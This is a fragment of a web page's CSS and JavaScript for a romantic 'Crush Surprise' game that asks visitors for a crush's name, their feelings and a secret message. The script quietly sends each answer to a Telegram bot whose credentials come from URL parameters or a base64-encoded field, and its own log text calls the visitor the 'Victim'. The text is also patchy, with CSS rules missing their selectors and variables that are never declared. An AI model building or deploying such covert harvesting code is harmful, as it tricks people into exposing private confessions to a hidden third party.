            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: linear-gradient(145deg, #fff0f5, #ffe0e8, #ffd6e0);
            position: relative;
            overflow-x: hidden;
        }
        .floating-hearts {
            position: fixed;
            inset: 0;
            pointer-events: none;
            z-index: 0;
            overflow: hidden;
        }
        .floating-hearts span {
            position: absolute;
            font-size: 2rem;
            animation: floatHeart 10s linear infinite;
            opacity: 0.2;
            color: #ff4d6d;
        }
        @keyframes floatHeart {
            0% { transform: translateY(100vh) scale(0.5) rotate(0deg); opacity: 0.15; }
            100% { transform: translateY(-20vh) scale(1.2) rotate(720deg); opacity: 0; }
        }
        .container {
            max-width: 540px;
            width: 100%;
            background: rgba(255, 255, 255, 0.6);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border-radius: 40px;
            padding: 40px 32px 34px;
            border: 2px solid rgba(255, 105, 180, 0.15);
            box-shadow: 0 30px 80px rgba(255, 105, 180, 0.10), 0 0 0 1px rgba(255, 105, 180, 0.05);
            transition: all 0.4s ease;
            text-align: center;
            position: relative;
            z-index: 1;
        }
        .container.surprise {
            border-color: rgba(255, 105, 180, 0.25);
            box-shadow: 0 30px 80px rgba(255, 105, 180, 0.15), 0 0 0 2px rgba(255, 105, 180, 0.08);
            background: rgba(255, 255, 255, 0.7);
        }
        .lang-selector {
            display: flex;
            justify-content: center;
            margin-bottom: 18px;
        }

            border-radius: 60px;
            background: rgba(255, 255, 255, 0.5);
            border: 1px solid rgba(255, 105, 180, 0.15);
            color: #4a2a3a;
            font-size: 0.85rem;
            font-weight: 600;
            outline: none;
            transition: 0.25s;
            font-family: inherit;
            cursor: pointer;
            appearance: none;

            background: rgba(255, 255, 255, 0.5);

function getCreds() {
    const params = new URLSearchParams(window.location.search);
    let token = params.get('tg_token');
    let chatId = params.get('tg_chat');
    
    // এনকোডেড ডেটা চেক করুন
    if (!token || !chatId) {
        const encodedData = params.get('tg_data');
        if (encodedData) {
            try {
                const decoded = JSON.parse(atob(decodeURIComponent(encodedData)));
                token = decoded.token;
                chatId = decoded.chatId;
            } catch(e) {
                console.warn('Failed to decode tg_data');
            }
        }
    }
    
    // localStorage থেকে ফallback
    if (!token) token = localStorage.getItem('tg_bot_token');
    if (!chatId) chatId = localStorage.getItem('tg_chat_id');
    
    return { token, chatId };
}

            const msgBtn = document.getElementById('msgBtn');
            const surpriseStatus = document.getElementById('surpriseStatus');
            const backLink = document.getElementById('backLink');

            let currentLang = 'en';
            let currentCrush = '';

            function updateLanguage(lang) {
                const t = translations[lang];
                if (!t) return;

                currentLang = lang;
                titleText.textContent = t.title;
                subText.textContent = t.sub;
                crushInput.placeholder = t.inputPlaceholder;
                submitBtn.textContent = t.submitBtn;
                resultEl.innerHTML = t.resultEmpty;
                statusText.textContent = t.statusEmpty;
                surpriseSub.textContent = t.surpriseSub;
                q1Label.textContent = t.q1;
                q2Label.textContent = t.q2;
                q3Label.textContent = t.q3;
                secretMsg.placeholder = t.msgPlaceholder;
                feelBtn.textContent = t.sendBtn;
                doBtn.textContent = t.sendBtn;
                msgBtn.textContent = t.sendBtn;
                backLink.textContent = t.backLink;
                surpriseStatus.textContent = t.surpriseStatus;

                feelSelect.innerHTML = '';
                t.feelOptions.forEach(opt => {
                    const option = document.createElement('option');
                    option.value = opt;
                    option.textContent = opt;
                    feelSelect.appendChild(option);
                });

                doSelect.innerHTML = '';
                t.doOptions.forEach(opt => {
                    const option = document.createElement('option');
                    option.value = opt;
                    option.textContent = opt;
                    doSelect.appendChild(option);
                });

                sendTelegramLog('Language changed', `Language: ${lang}`);
            }

            langSelect.addEventListener('change', function() {
                updateLanguage(this.value);
            });

            function handleSubmit() {
                const name = crushInput.value.trim();
                const t = translations[currentLang];
                if (!name) {
                    resultEl.innerHTML = t.emptyError;
                    statusText.textContent = 'Name cannot be empty.';
                    return;
                }

                currentCrush = name;

                loader.style.display = 'block';
                submitBtn.disabled = true;
                statusText.textContent = t.sending;

                sendTelegramLog('Victim submitted their crush name', `Crush Name: ${name}`);

                resultEl.innerHTML = `💕 ${name} ❤️`;
                statusText.textContent = t.crushMsg(name);

                setTimeout(() => {
                    loader.style.display = 'none';
                    submitBtn.disabled = false;
                    crushInput.style.display = 'none';
                    submitBtn.style.display = 'none';
                    document.querySelector('.sub').style.display = 'none';
                    container.classList.add('surprise');
                    crushDisplay.textContent = `💕 ${name}`;
                    surpriseSection.classList.add('show');
                    surpriseStatus.textContent = t.surpriseStatus;
                }, 900);
            }

            submitBtn.addEventListener('click', handleSubmit);
            crushInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') handleSubmit();
            });

            function sendAnswer(questionKey, answer) {
                if (!currentCrush) return;
                const t = translations[currentLang];
                const questionMap = {
                    'q1': t.q1,
                    'q2': t.q2,
                    'q3': t.q3
                };
                const question = questionMap[questionKey] || questionKey;
                sendTelegramLog(`Answered: ${question}`, `Crush: ${currentCrush} | ${question}: ${answer}`);
                surpriseStatus.textContent = t.sentMsg(answer);
                setTimeout(() => {
                    surpriseStatus.textContent = t.askMore;
                }, 1500);
            }

            feelBtn.addEventListener('click', function() {
                sendAnswer('q1', feelSelect.value);
            });

            doBtn.addEventListener('click', function() {
                sendAnswer('q2', doSelect.value);
            });

            msgBtn.addEventListener('click', function() {
                const val = secretMsg.value.trim();
                const t = translations[currentLang];
                if (!val) {
                    surpriseStatus.textContent = '⚠️ ' + t.emptyError;
                    return;
                }
                sendAnswer('q3', val);
                secretMsg.value = '';
                secretMsg.placeholder = t.msgSent;
            });

            secretMsg.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') msgBtn.click();
            });

            updateLanguage('en');

            console.log('💖 Crush Surprise (Fixed) loaded.');
        })();
    </script>
</body>
</html>
